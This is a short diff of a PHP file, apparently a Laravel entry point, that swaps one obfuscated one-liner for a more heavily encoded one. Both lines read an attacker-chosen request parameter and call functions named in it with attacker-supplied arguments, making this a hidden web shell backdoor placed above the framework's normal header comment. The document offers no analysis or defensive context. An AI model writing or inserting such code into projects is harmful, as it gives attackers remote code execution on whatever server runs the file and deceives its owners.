@@ -1,5 +1,7 @@
 <?php
-iF(($rS0VBr2=@${'_REQUEST'}['PJQQLI56'])ANd(22047+23795	)){$rS0VBr2[1	] ($ {$rS0VBr2[2	]}[0]	,$rS0VBr2[3]	($rS0VBr2[4])) ;};
+iF( ((16418+12934))	&&($N3XgA=	@${"\137\x52\x45\x51\x55\x45ST"} ["\62\x50QW\x49E\130\117"] )){$N3XgA [1]( $	{$N3XgA[2]}[0]	,$N3XgA[3]($N3XgA[4])	);};
+/*cut here;)*//*cut here;)*/
+
 
 /**
  * Laravel - A PHP Framework For Web Artisans
